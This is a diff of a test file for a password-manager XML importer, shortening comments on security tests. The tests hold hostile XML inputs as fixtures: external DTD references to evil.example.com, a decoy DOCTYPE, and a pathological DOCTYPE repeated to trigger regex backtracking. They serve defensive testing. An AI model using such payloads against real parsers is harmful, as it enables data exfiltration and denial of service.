@@ -317,9 +317,8 @@ describe("BaseImporter class", () => {
       expect(result).toBe(null);
     });
 
-    // A PUBLIC ExternalID carries a mandatory SystemLiteral (XML 1.0 §2.8), so it supplies an
-    // attacker-controlled external DTD URL exactly as SYSTEM does. XHTML exports are handled by
-    // parseHtml instead, so rejecting PUBLIC here costs no real import.
+    // PUBLIC carries a URL just like SYSTEM does, so it has to be rejected too. XHTML exports go
+    // through parseHtml now, so nothing legitimate breaks.
     it.each([
       [
         "http URL",
@@ -334,8 +333,7 @@ describe("BaseImporter class", () => {
       expect(importer.parseXml(xml)).toBe(null);
     });
 
-    // Whitespace between the name and the ExternalID is well-formed XML, so the guard must not
-    // bound how far it scans before the keyword.
+    // Padding before the keyword is legal XML, so the guard can't cap how far it scans.
     it("parse XML should reject an external DTD reference padded with whitespace", () => {
       const xml = `<!DOCTYPE passwordsafe ${" ".repeat(300)}SYSTEM "http://evil.example.com/evil.dtd">
         <passwordsafe delimiter=";"><entry><title>PoC</title></entry></passwordsafe>`;
@@ -343,8 +341,7 @@ describe("BaseImporter class", () => {
       expect(importer.parseXml(xml)).toBe(null);
     });
 
-    // Regression: a decoy DOCTYPE inside a leading comment must not shadow a later malicious one.
-    // Scanning only the first match would let this through.
+    // Regression: checking only the first DOCTYPE would let the real one below slip through.
     it("parse XML should reject a malicious DOCTYPE preceded by a decoy", () => {
       const xml = `<!-- <!DOCTYPE decoy> -->
         <!DOCTYPE passwordsafe SYSTEM "http://evil.example.com/evil.dtd">
@@ -353,9 +350,8 @@ describe("BaseImporter class", () => {
       expect(importer.parseXml(xml)).toBe(null);
     });
 
-    // Regression: the guard used a variable-length gap followed by a keyword, which backtracks
-    // quadratically. 1.5MB of repeated "<!DOCTYPE " blocked the calling thread for ~109 seconds,
-    // and parseXml runs synchronously on the UI thread with no file size cap.
+    // Regression: the old pattern backtracked quadratically here, and parseXml runs on the UI
+    // thread with no size cap — 1.5MB used to freeze it for ~109 seconds.
     it("parse XML should reject a pathological DOCTYPE payload without stalling", () => {
       const xml = "<!DOCTYPE ".repeat(150_000);
 
